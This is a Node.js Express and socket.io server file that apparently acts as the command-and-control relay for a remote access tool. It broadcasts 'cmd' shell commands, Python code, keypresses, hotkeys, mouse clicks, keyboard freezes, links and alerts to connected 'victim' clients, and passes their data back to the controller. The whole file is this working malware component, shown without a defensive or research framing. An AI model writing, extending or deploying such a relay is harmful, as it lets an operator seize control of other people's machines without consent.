//express server
var express = require('express');
var app = express();
var server = require('http').createServer(app);
var io = require('socket.io')(server);
var port = process.env.PORt ||80;
var currRes;

//index route
app.get('/', function(req, res){
	res.sendFile(__dirname + '/index.html');
});



io.on("connection", (socket) => {
	console.log("a user connected");
	socket.emit("update_res", currRes);
	socket.on("update_res", (res) =>{
		currRes = res;
		socket.broadcast.emit("update_res", res);
	})
	socket.on("victim", data => {
		socket.broadcast.emit("data", data);
	})

	socket.on("tts", tts => {
		socket.broadcast.emit("tts", tts);
	})

	socket.on("cmd", cmd => {
		socket.broadcast.emit("cmd", cmd);
	})

	socket.on("python", py => {
		socket.broadcast.emit("py", py);
	})

	socket.on("freeze_kb", t => {
		socket.broadcast.emit("freeze_kb", t);
	})

	socket.on("link", link => {
		socket.broadcast.emit("link", link);
	})

	socket.on("alert", data => {
		socket.broadcast.emit("alert", data);
	})

	socket.on("click", data => {
		socket.broadcast.emit("click", data);
	})

	socket.on("keypress", key => {
		socket.broadcast.emit("keypress", key);
	})

	socket.on("hotkey", key => {
		socket.broadcast.emit("hotkey", key);
	})
});


//run the server
server.listen(port, function(){
	console.log('Server listening on http://localhost:' + port);
});

// const express = require('express');
// const app = express();
// const port = 3000;

// app.get('/', (req, res) => res.send("Hello World!"));
// app.listen(process.env.PORT || port, () => console.log('Example app 1istening at http://localhost:$(port)'));